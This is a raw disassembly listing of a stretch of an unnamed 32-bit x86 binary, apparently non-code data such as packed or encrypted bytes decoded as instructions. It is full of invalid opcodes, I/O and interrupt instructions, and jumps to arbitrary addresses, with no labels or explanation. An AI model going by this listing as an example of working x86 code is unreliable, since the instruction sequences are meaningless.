  43976a:	ins    BYTE PTR es:[edi],dx
  43976b:	int    0xf3
  43976d:	adc    BYTE PTR [ebp-0x47767425],dh
  439773:	and    DWORD PTR [esi],0xde61b9f3
  439779:	imul   edi,eax,0xffffffed
  43977c:	or     cl,BYTE PTR [ecx+0x20ef1e29]
  439782:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  439783:	js     0x439770
  439785:	jb     0x43977a
  439787:	xor    eax,0x56b037fd
  43978c:	imul   eax,DWORD PTR [ebx+0x6],0xffffffeb
  439790:	daa    
  439791:	imul   eax,DWORD PTR [eax],0x0
  439794:	add    BYTE PTR [eax],al
  439796:	add    BYTE PTR [ebp-0x69282f68],al
  43979c:	repnz fnstcw WORD PTR [ebp-0x3d]
  4397a0:	(bad)  
  4397a1:	out    0x3,al
  4397a3:	mov    ds:0xc5efc2ce,al
  4397a8:	add    BYTE PTR ds:[esi+esi*2+0x2588e702],ch
  4397b0:	inc    edx
  4397b1:	int    0xf4
  4397b3:	lock cmp cl,BYTE PTR [edi-0x2481820c]
  4397ba:	add    al,0x75
  4397bc:	add    ah,BYTE PTR [edi+0x65]
  4397bf:	ins    BYTE PTR es:[edi],dx
  4397c0:	into   
  4397c1:	or     ecx,DWORD PTR [esi]
  4397c3:	inc    edx
  4397c4:	rcl    bh,1
  4397c6:	jge    0x4397e2
  4397c8:	adc    BYTE PTR [eax],al
  4397ca:	test   eax,0xa286991f
  4397cf:	stc    
  4397d0:	test   DWORD PTR [eax],edx
  4397d2:	mov    edx,0x73e7fd91
  4397d7:	xor    al,0x8a
  4397d9:	(bad)  
  4397da:	call   0x8a109a55
  4397df:	and    DWORD PTR [esi],ebx
  4397e1:	xlat   BYTE PTR ds:[ebx]
  4397e2:	retf   0x352d
  4397e5:	jmp    0x4397d1
  4397e7:	xchg   BYTE PTR [ebx+0x54],bh
  4397ea:	int    0xde
  4397ec:	ret    
  4397ed:	hlt    
  4397ee:	ficomp WORD PTR [edi-0x30d6d308]
  4397f4:	cwde   
  4397f5:	xchg   BYTE PTR [edx],dh
  4397f7:	stc    
  4397f8:	test   DWORD PTR [eax],edx
  4397fa:	cmp    al,BYTE PTR [eax]
  4397fc:	add    BYTE PTR [eax],al
  4397fe:	add    BYTE PTR [eax],al
  439800:	adc    ebp,edi
  439802:	out    0x62,eax
  439804:	fstp   QWORD PTR [edi]
  439806:	add    al,0x72
  439808:	mov    ch,0x1f
  43980a:	or     al,0xa
  43980c:	dec    esp
  43980d:	jge    0x439813
  43980f:	pop    eax
  439810:	or     dh,BYTE PTR [edx]
  439812:	mov    edi,0xcc7d8943
  439817:	ror    DWORD PTR [edx+0x35],cl
  43981a:	jmp    0x43988f
  43981c:	mov    cl,0x9a
  43981e:	adc    dh,ah
  439820:	repnz xchg ebx,eax
  439822:	add    cl,ch
  439824:	jbe    0x4397a8
  439826:	fcomip st,st(6)
  439828:	inc    edx
  439829:	loopne 0x439860
  43982b:	and    BYTE PTR [edx],ch
  43982d:	hlt    
  43982e:	test   DWORD PTR [eax],eax
  439830:	bound  eax,QWORD PTR [edx+0x62]
  439833:	cmp    al,0xc3
  439835:	cmp    eax,0x3646aa80
  43983a:	loopne 0x43982e
  43983c:	into   
  43983d:	jl     0x43980a
  43983f:	xchg   ecx,eax
  439840:	jno    0x439844
  439842:	add    cl,ch
  439844:	imul   esp,DWORD PTR [edx+0x48],0x0
  439848:	xchg   BYTE PTR ds:0xe1efc51b,dl
  43984e:	cli    
  43984f:	iret   
  439850:	aaa    
  439851:	inc    DWORD PTR [eax-0x7cdd878c]
  439857:	(bad)  
  439858:	daa    
  439859:	cmp    ebx,DWORD PTR ds:0x6bcd728
  43985f:	sub    BYTE PTR [eax-0x1],0xff
  439863:	inc    DWORD PTR [eax]
  439865:	add    BYTE PTR [eax],al
  439867:	add    BYTE PTR [eax],al
  439869:	push   edi
  43986a:	sbb    DWORD PTR ds:0x22a86718,0xfffffff2
  439871:	pop    edi
  439872:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  439873:	cli    
  439874:	mov    edx,ebx
  439876:	(bad)  
  439877:	dec    BYTE PTR [ecx+0x5681fd9a]
  43987d:	into   
  43987e:	jnp    0x43983e
  439880:	add    esp,DWORD PTR [eax+edi*1]
  439883:	cli    
  439884:	xchg   ebx,ebp
  439886:	cld    
  439887:	jp     0x439850
  439889:	(bad)  
  43988a:	stos   DWORD PTR es:[edi],eax
  43988b:	mov    ds:0x2c1ad88b,eax
  439890:	jmp    0x3a4841
  439895:	pop    ds
  439896:	mov    ch,0xf8
  439898:	je     0x4398ab
  43989a:	idiv   BYTE PTR [ebx+0x24]
  43989d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43989e:	sub    dh,BYTE PTR [eax+0x1d81e74f]
  4398a4:	sbb    dh,dl
  4398a6:	or     al,0x7b
  4398a8:	jmp    0x18256fc
  4398ad:	in     al,0x4c
  4398af:	sti    
  4398b0:	xchg   DWORD PTR [ebx],ebx
  4398b2:	or     DWORD PTR [ebx-0x39],edi
  4398b5:	pop    eax
  4398b6:	fldenv [ecx-0x92c8b17]
  4398bc:	jmp    esp
  4398be:	inc    esi
  4398bf:	or     BYTE PTR [ebp+0x722],al
  4398c5:	jne    0x43985a
  4398c7:	std    
  4398c8:	push   DWORD PTR [ebp+0x2b]
  4398cb:	xor    al,0xe0
  4398cd:	add    BYTE PTR [eax],al
  4398cf:	add    BYTE PTR [eax],al
  4398d1:	add    BYTE PTR [ebp+0x34fd410c],ch
  4398d7:	mov    ch,0xb7
  4398d9:	and    edi,DWORD PTR [ebp-0x5c]
  4398dc:	pop    es
  4398dd:	jle    0x4398eb
  4398df:	mov    dh,0x4d
  4398e1:	stc    
  4398e2:	cli    
  4398e3:	rol    ebx,cl
  4398e5:	or     al,bh
  4398e7:	lea    eax,[edx]
  4398e9:	add    BYTE PTR [ebp-0x2d],dh
  4398ec:	cld    
  4398ed:	push   DWORD PTR [ebp+0x2b]
  4398f0:	xor    al,0xe0
  4398f2:	sub    eax,0xb4fd424c
  4398f7:	mov    ah,0xb7
  4398f9:	and    edi,DWORD PTR [ecx-0x5c]
  4398fc:	pop    es
  4398fd:	jle    0x4398cb
  4398ff:	push   edx
  439900:	push   eax
  439901:	stc    
  439902:	mov    edx,0x39853bb4
  439907:	pop    es
  439908:	sbb    cl,dh
  43990a:	int3   
  43990b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43990c:	xlat   BYTE PTR ds:[ebx]
  43990d:	and    ebx,DWORD PTR [ebp+0x14]
  439910:	inc    edx
  439911:	or     edi,esi
  439913:	jmp    0x2cb89919
  439918:	cmp    edi,DWORD PTR [ebp+0x9]
  43991b:	unpcklps xmm0,XMMWORD PTR [eax]
  43991e:	or     BYTE PTR [edi],al
  439920:	sbb    edi,DWORD PTR [edi+0x447b1b76]
  439926:	cdq    
  439927:	add    ecx,DWORD PTR [ebx]
  439929:	mov    edi,0xbf1c8be3
  43992e:	data16 (bad) 
  439930:	jp     0x439923
  439932:	mov    ?,WORD PTR ds:0x525c
  439938:	add    BYTE PTR [eax],al
  43993a:	add    BYTE PTR [esi-0x61b22a16],cl
  439940:	jmp    0xee1c:0x37eea452
  439947:	dec    esi
  439948:	add    ch,BYTE PTR [edi]
  43994a:	jge    0x439905
  43994c:	out    0x16,al
  43994e:	or     eax,0x502b83d
  439953:	test   eax,0x250512e6
  439958:	in     eax,dx
  439959:	mov    bh,0x1c
  43995b:	cmp    eax,0x6d28238d
  439960:	std    
  439961:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  439962:	(bad)  [ebp+ebp*8-0x59]
  439966:	push   esp
  439967:	ror    DWORD PTR [ebx+ebx*1+0x2b8dad28],1
  43996e:	sub    BYTE PTR [ebp+0x7cd9a7fd],ah
  439974:	in     eax,dx
  439975:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  439976:	push   esp
  439977:	adc    DWORD PTR [ebp+0x2ce31c7a],ecx
  43997d:	rol    DWORD PTR [eax*8+0x397c77ec],cl
  439984:	out    0xce,al
  439986:	or     al,0xfa
  439988:	mov    bh,0xee
  43998a:	sbb    al,0xf2
  43998c:	xor    al,0x83
  43998e:	jl     0x439934
  439990:	in     al,dx
  439991:	push   esp
  439992:	jl     0x439941
  439994:	xor    al,0x83
  439996:	jl     0x4399b9
  439998:	out    0x12,al
  43999a:	pop    ebx
  43999b:	add    DWORD PTR [eax+0x3a],0x50
  43999f:	add    BYTE PTR [eax],al
  4399a1:	add    BYTE PTR [eax],al
  4399a3:	add    al,dh
  4399a5:	inc    eax
  4399a6:	loop   0x439980
  4399a8:	ins    DWORD PTR es:[edi],dx
  4399a9:	mov    al,0x23
  4399ab:	jl     0x43993d
  4399ad:	adc    BYTE PTR [ecx-0x65f066d9],dl
  4399b3:	fs jl  0x439966
  4399b6:	and    BYTE PTR [edi],0x79
  4399b9:	jp     0x3073061c
  4399bf:	jl     0x439972
  4399c1:	out    0xee,al
  4399c3:	pop    esp
  4399c4:	dec    edx
  4399c5:	nop
  4399c6:	add    dh,ah
  4399c8:	mov    DWORD PTR [edi+0x7d],edi
  4399cb:	in     al,dx
  4399cc:	xchg   edi,eax
  4399cd:	mov    cl,0xd
  4399cf:	not    BYTE PTR [eax+0x35]
  4399d2:	or     DWORD PTR [edi+0x7b],ecx
  4399d5:	mov    ebp,0x2f23edc1
  4399da:	cli    
  4399db:	push   0xffffffac
  4399dd:	loop   0x4399e7
  4399df:	sar    BYTE PTR [edx+0xac9d509],cl
  4399e5:	mov    edx,0x5c33e6df
  4399ea:	test   ebp,esp
  4399ec:	test   DWORD PTR [ecx],0xa9f2b5b2
  4399f2:	(bad)  
  4399f3:	ror    BYTE PTR [ecx-0x7a],cl
  4399f6:	rcr    BYTE PTR [eax+edx*8],0x80
  4399fa:	call   0x7c3b96f8
  4399ff:	int    0xc6
  439a01:	or     al,BYTE PTR [edx+0x274dd]
  439a07:	mov    al,0x0
  439a09:	add    BYTE PTR [eax],al
  439a0b:	add    BYTE PTR [eax],al
  439a0d:	stos   BYTE PTR es:[edi],al
  439a0e:	jecxz  0x439a23
  439a10:	imul   ah
  439a12:	daa    
  439a13:	por    mm6,QWORD PTR [esi+0x2]
  439a17:	test   DWORD PTR [ecx],edi
  439a19:	xor    BYTE PTR [eax],ch
  439a1b:	adc    BYTE PTR [ecx+0x49840aa9],al
  439a21:	jno    0x439a25
  439a23:	add    BYTE PTR [edx+0x19],ch
  439a26:	or     DWORD PTR [ebp+edx*8-0x75],esi
  439a2a:	dec    esi
  439a2b:	mov    edi,0x947a0e6
  439a30:	scas   eax,DWORD PTR es:[edi]
  439a31:	xor    ebp,esp
  439a33:	out    0xca,eax
  439a35:	jb     0x4399bb
  439a37:	add    BYTE PTR [edi+0x37fe3f37],bh
  439a3d:	bound  ecx,QWORD PTR [esi-0x41]
  439a40:	push   0xffffffc4
  439a42:	loop   0x439ab4
  439a44:	add    BYTE PTR [esi],ch
  439a46:	inc    eax
  439a47:	addr16 cmc 
  439a49:	pop    ebx
  439a4a:	pop    ebp
  439a4b:	aaa    
  439a4c:	adc    DWORD PTR [edx+0x4af3070a],0xffffff84
  439a53:	mov    ebp,0xbedc2b20
  439a58:	mov    ebp,DWORD PTR [eax-0x16]
  439a5b:	or     ecx,DWORD PTR [edi]
  439a5d:	out    0xda,eax
  439a5f:	push   es
  439a60:	jle    0x439a96
  439a62:	inc    eax
  439a63:	js     0x439a3a
  439a65:	xchg   DWORD PTR [edi],eax
  439a67:	jnp    0x439a78
  439a69:	cmp    bh,0x82
  439a6c:	fmul   st,st(5)
  439a6e:	fisttp DWORD PTR [edi]
  439a70:	sub    eax,DWORD PTR [eax]
  439a72:	add    BYTE PTR [eax],al
  439a74:	add    BYTE PTR [eax],al
  439a76:	xor    eax,0x44c96740
  439a7b:	xor    ecx,DWORD PTR [eax]
  439a7d:	test   BYTE PTR [eax],bh
  439a7f:	add    eax,DWORD PTR [eax]
  439a81:	add    BYTE PTR [edi-0x5d],cl
  439a84:	push   es
  439a85:	je     0x439a2a
  439a87:	aas    
  439a88:	int3   
  439a89:	ror    ebx,0x5c
  439a8c:	ror    DWORD PTR [edi],0xca
  439a8f:	lds    esp,FWORD PTR [edx]
  439a91:	call   0xc1d945
  439a96:	push   0x43
  439a98:	stc    
  439a99:	add    dh,BYTE PTR ds:0x782473be
  439a9f:	mov    ebx,0xe6d02bbe
  439aa4:	daa    
  439aa5:	cmp    ecx,DWORD PTR [edi+0x40]
  439aa8:	jnp    0x439a53
  439aaa:	pushf  
  439aab:	add    al,BYTE PTR [eax]
  439aad:	mov    eax,DWORD PTR [esi-0x44]
  439ab0:	out    dx,al
  439ab1:	sub    edi,DWORD PTR [edi]
  439ab3:	test   cl,ah
  439ab5:	add    edx,DWORD PTR [esi]
  439ab7:	add    eax,0x47e60788
  439abc:	cli    
  439abd:	mov    DWORD PTR [edx],esp
  439abf:	add    al,0x7b
  439ac1:	(bad)  
  439ac2:	jne    0x439aec
  439ac4:	jne    0x439b07
  439ac6:	je     0x439a6b
  439ac8:	mov    cl,0xfd
  439aca:	imul   esp
  439acc:	std    
  439acd:	in     al,dx
  439ace:	adc    DWORD PTR [ecx-0x5f6edc30],esi
  439ad4:	test   al,0x23
  439ad6:	ins    DWORD PTR es:[edi],dx
  439ad7:	add    ah,BYTE PTR [eax]
  439ad9:	stc    
  439ada:	add    BYTE PTR [eax],al
  439adc:	add    BYTE PTR [eax],al
  439ade:	add    BYTE PTR [edx],dh
  439ae0:	and    eax,0xa8754779
  439ae5:	inc    esi
  439ae6:	jmp    FWORD PTR [ecx+0x517c0593]
  439aec:	add    ebx,eax
  439aee:	lods   eax,DWORD PTR ds:[esi]
  439aef:	ret    0x35b0
  439af2:	xchg   BYTE PTR [edx-0x58],dh
  439af5:	push   esp
  439af6:	std    
  439af7:	cli    
  439af8:	in     al,dx
  439af9:	cld    
  439afa:	xchg   DWORD PTR [edx+0x76417529],esi
  439b00:	test   al,0x42
  439b02:	add    al,0xe6
  439b04:	shl    DWORD PTR [esi+0x5c],1
  439b07:	cdq    
  439b08:	and    edx,DWORD PTR [esi+0x0]
  439b0b:	fimul  DWORD PTR [ebx+ecx*2-0x3c2c2d7b]
  439b12:	or     al,dh
  439b14:	popf   
  439b15:	add    al,0x0
  439b17:	jne    0x439ac1
  439b19:	arpl   WORD PTR [ecx],cx
  439b1b:	push   0xffffff98
  439b1d:	cmp    eax,0x1eea3309
  439b22:	or     al,0xf0
  439b24:	sub    ebp,DWORD PTR [ebx+0x3728753c]
  439b2a:	test   DWORD PTR [ecx-0x60],esi
  439b2d:	push   esp
  439b2e:	int3   
  439b2f:	xchg   ebx,eax
  439b30:	les    ecx,FWORD PTR [edx-0x7b]
  439b33:	mov    dl,BYTE PTR [ebx-0x7a07f73c]
  439b39:	add    al,0x0
  439b3b:	jne    0x439ae5
  439b3d:	arpl   WORD PTR [ecx],cx
  439b3f:	add    BYTE PTR [edx],0x36
  439b42:	inc    ebx
  439b43:	add    BYTE PTR [eax],al
  439b45:	add    BYTE PTR [eax],al
  439b47:	add    BYTE PTR [esp+edi*4+0x27],bh
  439b4b:	and    DWORD PTR [ecx-0x79],esi
  439b4e:	out    0xad,eax
  439b50:	cdq    
  439b51:	add    bl,BYTE PTR [esi-0x38]
  439b54:	xchg   esi,eax
  439b55:	push   cs
  439b56:	out    0x38,al
  439b58:	lock add eax,0x3d6a5b6f
  439b5e:	repnz dec esp
  439b60:	lock cmp al,0x5e
  439b63:	cmp    al,0xf8
  439b65:	lds    ecx,FWORD PTR [edx]
  439b67:	sbb    BYTE PTR [ebx+ebx*2],ah
  439b6a:	outs   dx,BYTE PTR ds:[esi]
  439b6b:	xlat   BYTE PTR ds:[ebx]
  439b6c:	push   esi
  439b6d:	cli    
  439b6e:	or     eax,0x85806c41
  439b73:	add    esi,DWORD PTR [ebp+0x2]
  439b76:	out    0x38,al
  439b78:	mov    BYTE PTR [esi-0x488aebfe],bh
  439b7e:	push   es
  439b7f:	sbb    DWORD PTR [edx-0x3df74900],edi
  439b85:	mov    bl,0x3e
  439b87:	sbb    DWORD PTR [edx-0x1b87bcd0],edi
  439b8d:	call   0xf972f427
  439b92:	mov    bh,0xd5
  439b94:	cmp    cl,ch
  439b96:	xchg   edi,eax
  439b97:	push   eax
  439b98:	adc    DWORD PTR [ecx+0x28d01872],ecx
  439b9e:	daa    
  439b9f:	jns    0x439bd2
  439ba1:	out    0xb6,al
  439ba3:	or     BYTE PTR [ebp+0x21010eb3],bh
  439ba9:	out    0x12,al
  439bab:	add    DWORD PTR [eax],eax
  439bad:	add    BYTE PTR [eax],al
  439baf:	add    BYTE PTR [eax],al
  439bb1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  439bb2:	call   0xf8f0b40e
  439bb7:	aaa    
  439bb8:	aad    0x58
  439bba:	jmp    0x8914ebd6
  439bbf:	mov    bl,0x27
  439bc1:	cmp    eax,0x52a50089
  439bc6:	repnz xor al,0x18
  439bc9:	dec    eax
  439bca:	push   ss
  439bcb:	and    eax,0x8566c538
  439bd0:	push   ss
  439bd1:	jge    0x439c00
  439bd3:	in     eax,0xf9
  439bd5:	jne    0x439c09
  439bd7:	and    eax,0x724b7d18
  439bdc:	icebp  
  439bdd:	ins    DWORD PTR es:[edi],dx
  439bde:	dec    ebx
  439bdf:	in     eax,dx
  439be0:	inc    ebp
  439be1:	mov    ebp,0xc2fa2531
  439be6:	inc    esp
  439be7:	in     eax,dx
  439be8:	inc    ebp
  439be9:	lods   eax,DWORD PTR ds:[esi]
  439bea:	mov    dh,0x23
  439bec:	adc    eax,0xf123deaa
  439bf1:	shl    esi,0xf9
  439bf4:	(bad)  
  439bf5:	scas   al,BYTE PTR es:[edi]
  439bf6:	jae    0x439bf0
  439bf8:	sub    al,0x3a
  439bfa:	cmp    al,0xb7
  439bfc:	jecxz  0x439c74
  439bfe:	add    al,BYTE PTR [eax]
  439c00:	rcr    BYTE PTR [ebp+0x6a],cl
  439c03:	and    BYTE PTR ds:0xe90074fd,bh
  439c09:	jbe    0x439c0d
  439c0b:	mov    dh,0xf2
  439c0d:	jbe    0x439c11
  439c0f:	add    BYTE PTR [edx+0x34f474cd],dl
  439c15:	add    BYTE PTR [eax],al
  439c17:	add    BYTE PTR [eax],al
  439c19:	add    BYTE PTR [edx+0x76f3b73b],dh
  439c1f:	add    al,BYTE PTR [eax]
  439c21:	xchg   edx,eax
  439c22:	rol    DWORD PTR [esi+0x736ac574],0xfc
  439c29:	adc    al,0xb2
  439c2b:	cmp    esi,DWORD PTR [edi+0x276d3]
  439c31:	push   edx
  439c32:	jno    0x439bb9
  439c34:	inc    esp
  439c35:	add    eax,0xddc780d1
  439c3a:	jae    0x439bbf
  439c3c:	dec    eax
  439c3d:	icebp  
  439c3e:	adc    eax,edx
  439c40:	sbb    eax,DWORD PTR [eax]
  439c42:	add    eax,0xf00e436
  439c47:	or     DWORD PTR [eax-0x40],eax
  439c4a:	iret   
  439c4b:	(bad)  
  439c4c:	stc    
  439c4d:	je     0x439cad
  439c4f:	mov    esp,0x1b188bd4
  439c54:	pop    eax
  439c55:	mov    esp,DWORD PTR [edi-0x72e3b045]
  439c5b:	(bad)  
  439c5d:	sub    ch,BYTE PTR [ebp-0x3b]
  439c60:	fadd   DWORD PTR [ebx]
  439c62:	daa    
  439c63:	out    dx,al
  439c64:	cmp    BYTE PTR [eax+0x50],0xbe
  439c68:	push   ecx
  439c69:	cmp    al,0xd7
  439c6b:	sti    
  439c6c:	test   BYTE PTR [eax+edi*1+0x23],bl
  439c70:	xor    bl,BYTE PTR [eax+edi*2+0x32]
  439c74:	outs   dx,BYTE PTR ds:[esi]
  439c75:	adc    al,0x87
  439c77:	rol    DWORD PTR [edx+0x1d639518],cl
  439c7d:	adc    al,0x0
  439c7f:	add    BYTE PTR [eax],al
  439c81:	add    BYTE PTR [eax],al
  439c83:	pop    ds
  439c84:	aam    0x82
  439c86:	pop    eax
  439c87:	sbb    BYTE PTR [ebx+eiz*8+0x1d630d0b],al
  439c8e:	adc    al,0x95
  439c90:	btr    DWORD PTR [ecx],eax
  439c93:	fdiv   st(6),st
  439c95:	call   edx
  439c97:	(bad)  
  439c98:	jnp    0x439d16
  439c9a:	cmp    eax,0x3ac68c
  439c9f:	into   
  439ca0:	push   ecx
  439ca1:	add    DWORD PTR [edi],ecx
  439ca3:	shufps xmm0,XMMWORD PTR [esi],0x7e
  439ca7:	sbb    DWORD PTR [eax],edi
  439ca9:	jo     0x439cce
  439cab:	out    0xbd,eax
  439cad:	popa   
  439cae:	cmp    BYTE PTR [edi+0x63],dl
  439cb1:	sbb    eax,0x6de8e714
  439cb6:	or     al,BYTE PTR [edi-0x583c8518]
  439cbc:	mov    ebp,0xc0750457
  439cc1:	cli    
  439cc2:	and    al,0x86
  439cc4:	shl    DWORD PTR [esi],cl
  439cc6:	jge    0x439c7b
  439cc8:	das    
  439cc9:	jl     0x439d3b
  439ccb:	jns    0x439c7d
  439ccd:	mov    al,ds:0x26306523
  439cd2:	jb     0x439c54
  439cd4:	add    al,0x25
  439cd6:	jg     0x439d0e
  439cd8:	sub    eax,DWORD PTR [eax+eax*1]
  439cdb:	jne    0x439c8f
  439cdd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  439cde:	cmovle ebx,DWORD PTR [edi]
  439ce1:	sbb    dh,ch
  439ce3:	dec    edx
  439ce4:	jmp    0x445e6c
  439ce9:	add    BYTE PTR [eax],al
  439ceb:	add    BYTE PTR [edx+ebp*1-0x3],dh
  439cef:	(bad)  
  439cf0:	in     al,dx
  439cf1:	sub    ebp,0x7c
  439cf4:	xor    DWORD PTR [eax+ebp*2+0x55],ebp
  439cf8:	ror    BYTE PTR [ecx+0x7039bca6],1
  439cfe:	cmp    ah,cl
  439d00:	xor    DWORD PTR [eax+0x38],ebp
  439d03:	int3   
  439d04:	sub    edi,esi
  439d06:	jp     0x439cf4
  439d08:	div    BYTE PTR [edi-0x38]
  439d0b:	test   BYTE PTR [eax+0x72c0145b],ah
  439d11:	mov    al,0x3b
  439d13:	test   DWORD PTR [ebx+ebp*2],esi
  439d16:	pop    ebp
  439d17:	adc    BYTE PTR [esi+0x6a],bh
  439d1a:	scas   al,BYTE PTR es:[edi]
  439d1b:	xchg   BYTE PTR [eax],dh
  439d1d:	(bad)  
  439d1e:	je     0x439d63
  439d20:	or     eax,0xecabb8b3
  439d25:	out    0x93,al
  439d27:	xchg   DWORD PTR [eax],edi
  439d29:	iret   
  439d2a:	je     0x439d6f
  439d2c:	or     eax,0xecbbb8b3
  439d31:	fiadd  WORD PTR [ebx+0x2d]
  439d34:	mov    ch,0x18
  439d36:	jnp    0x439db3
  439d38:	sbb    DWORD PTR [esi+0x28f7431],0x9dee024e
  439d42:	out    0x3,eax
  439d44:	jne    0x439d48
  439d46:	loop   0x439cd8
  439d48:	add    ecx,0xc73148c0
  439d4e:	mov    dh,BYTE PTR [edi+0x0]
  439d51:	add    BYTE PTR [eax],al
  439d53:	add    BYTE PTR [eax],al
  439d55:	xor    edi,eax
  439d57:	add    ah,0x41
  439d5a:	inc    esp
  439d5b:	mov    ch,0x59
  439d5d:	clc    
  439d5e:	scas   al,BYTE PTR es:[edi]
  439d5f:	into   
  439d60:	jl     0x439de1
  439d62:	mov    esi,DWORD PTR [edi+eax*2+0x3e7091d]
  439d69:	jne    0x439cfd
  439d6b:	mov    DWORD PTR [ecx+edx*8-0x39fbbd41],eax
  439d72:	add    BYTE PTR [edi+0x76033d84],ch
  439d78:	push   ebp
  439d79:	repnz mov esi,0xb03d0d02
  439d7f:	jecxz  0x439dfb
  439d81:	mov    dh,0x36
  439d83:	outs   dx,BYTE PTR ds:[esi]
  439d84:	cmp    esi,esi
  439d86:	inc    ecx
  439d87:	push   esp
  439d88:	sbb    esi,eax
  439d8a:	mov    esi,0x41657cfa
  439d8f:	and    al,0xf4
  439d91:	dec    edx
  439d92:	add    esp,edi
  439d94:	add    edi,eax
  439d96:	(bad)  
  439d97:	(bad)  
  439d98:	jp     0x439e0d
  439d9a:	test   edi,esp
  439d9c:	(bad)  
  439d9d:	stc    
  439d9e:	adc    DWORD PTR [eax-0x3],esp
  439da1:	imul   eax,DWORD PTR [edx],0xffb5a8eb
  439da7:	out    0x3,eax
  439da9:	jne    0x439dad
  439dab:	(bad)  
  439dac:	inc    ebx
  439dad:	das    
  439dae:	lea    eax,[esi+eiz*4+0x23dd509]
  439db5:	jne    0x439db9
  439db7:	out    0xc,eax
  439db9:	add    BYTE PTR [eax],al
  439dbb:	add    BYTE PTR [eax],al
  439dbd:	add    al,bh
  439dbf:	scas   eax,DWORD PTR es:[edi]
  439dc0:	jmp    ebx
  439dc2:	xchg   esp,eax
  439dc3:	mov    ch,0x7b
  439dc5:	or     al,0xd5
  439dc7:	add    DWORD PTR [ebx-0x14],esi
  439dca:	mov    ecx,0x41dbd7ed
  439dcf:	out    dx,eax
  439dd0:	(bad)  
  439dd1:	fidivr DWORD PTR [ecx-0x7f]
  439dd4:	pop    ebx
  439dd5:	dec    ebp
  439dd6:	clc    
  439dd7:	cmp    cl,bh
  439dd9:	jmp    0x6d0a1d54
  439dde:	call   0x4aaf:0x5e5ffe4
  439de5:	test   DWORD PTR [ecx+0x48],esi
  439de8:	and    eax,0x3f122e3f
  439ded:	push   0xffffffaf
  439def:	or     DWORD PTR [edx+0x6],esi
  439df2:	shl    DWORD PTR [ebx-0x437f9bf9],1
  439df8:	or     al,0x6c
  439dfa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  439dfb:	scas   al,BYTE PTR es:[edi]
  439dfc:	add    ch,BYTE PTR [edx-0x52]
  439dff:	aaa    
  439e00:	ins    DWORD PTR es:[edi],dx
  439e01:	jecxz  0x439de4
  439e03:	fidivr DWORD PTR [ecx+eiz*1-0x43]
  439e07:	fadd   QWORD PTR [esp+ecx*8-0x56d28934]
  439e0e:	cmp    eax,DWORD PTR [ecx+0x39016f43]
  439e14:	stc    
  439e15:	jmp    0x744bbb90
  439e1a:	aad    0xde
  439e1c:	(bad)  
  439e1d:	call   0x4fd3a098
  439e22:	add    BYTE PTR [eax],al
  439e24:	add    BYTE PTR [eax],al
  439e26:	add    BYTE PTR [esi-0x3a],ch
  439e29:	add    ah,BYTE PTR [ebp-0x35]
  439e2c:	ss inc ebp
  439e2e:	in     al,dx
  439e2f:	add    dh,BYTE PTR [esi-0x7f471441]
  439e35:	dec    esp
  439e36:	in     al,dx
  439e37:	push   edx
  439e38:	mov    ch,0xf7
  439e3a:	out    dx,eax
  439e3b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  439e3c:	and    BYTE PTR [ebp+0x2c2e6100],al
  439e42:	rcl    BYTE PTR [ecx-0xc],0x73
  439e46:	sub    al,0x82
  439e48:	cmp    DWORD PTR [edi+eax*2],0xffffff9c
  439e4c:	inc    edi
  439e4d:	sbb    DWORD PTR [edi],ecx
  439e4f:	add    edi,DWORD PTR [ebx]
  439e51:	inc    eax
  439e52:	lsl    edi,WORD PTR [ebx+0x46]
  439e56:	test   BYTE PTR [edi],dl
  439e58:	push   ecx
  439e59:	adc    eax,0x46021566
  439e5e:	lsl    edi,WORD PTR [edx]
  439e61:	inc    eax
  439e62:	cmp    ax,WORD PTR [edx+0x46]
  439e66:	test   bh,dl
  439e68:	push   ecx
  439e69:	add    DWORD PTR [ebp+0x407d7a08],ecx
  439e6f:	push   edi
  439e70:	shr    DWORD PTR [ecx-0x2c],0xe7
  439e74:	clc    
  439e75:	jp     0x439e5f
  439e77:	pop    esp
  439e78:	xchg   bh,dh
  439e7a:	(bad)  
  439e7b:	jnp    0x439e3c
  439e7d:	jae    0x439eb5
  439e7f:	add    al,0x47
  439e81:	or     al,0xc7
  439e83:	adc    edi,ebx
  439e85:	pop    edi
  439e86:	dec    ebp
  439e87:	fadd   QWORD PTR [edx]
  439e89:	mov    edi,0x45
  439e8e:	add    BYTE PTR [eax],al
  439e90:	jl     0x439ef0
  439e92:	inc    ebp
  439e93:	inc    eax
  439e94:	or     al,0xb6
  439e96:	inc    esp
  439e97:	in     al,0x47
  439e99:	adc    edi,DWORD PTR [eax-0x6c1a720]
  439e9f:	sub    al,0x1e
  439ea1:	add    DWORD PTR [eax],eax
  439ea3:	add    BYTE PTR [ebp+0x6cb8d542],al
  439ea9:	jns    0x439ee4
  439eab:	add    BYTE PTR [ecx+0x4],bh
  439eae:	cli    
  439eaf:	(bad)  
  439eb0:	fdivr  st(7),st
  439eb2:	cmp    al,0xe4
  439eb4:	int3   
  439eb5:	std    
  439eb6:	(bad)  
  439eb7:	inc    DWORD PTR [edi]
  439eb9:	cmp    al,BYTE PTR [ebp+eax*2+0x437c2d75]
  439ec0:	test   eax,0x66e3c05f
  439ec5:	sub    ebp,edi
  439ec7:	(bad)  
  439ec8:	in     al,dx
  439ec9:	frstor [ebx-0x7b]
  439ecc:	dec    eax
  439ecd:	push   ebp
  439ece:	jbe    0x439ede
  439ed0:	imul   di,WORD PTR [ebx+eax*2-0x63],0xbfb1
  439ed7:	repz in al,dx
  439ed9:	gs sub eax,0x84cd4085
  439edf:	dec    DWORD PTR [edx-0x6a3302d8]
  439ee5:	mov    cl,0xaf
  439ee7:	out    0xee,eax
  439ee9:	shl    BYTE PTR [edi+0x48],0x72
  439eed:	mov    ds:0x5efcd3c7,eax
  439ef2:	and    eax,0x87
  439ef7:	add    BYTE PTR [eax],al
  439ef9:	mov    al,0xef
  439efb:	jge    0x439ef7
  439efd:	je     0x439e8d
  439eff:	cli    
  439f00:	cmp    ch,BYTE PTR [ecx+0x5efffd28]
  439f06:	and    bh,BYTE PTR [esi-0x6]
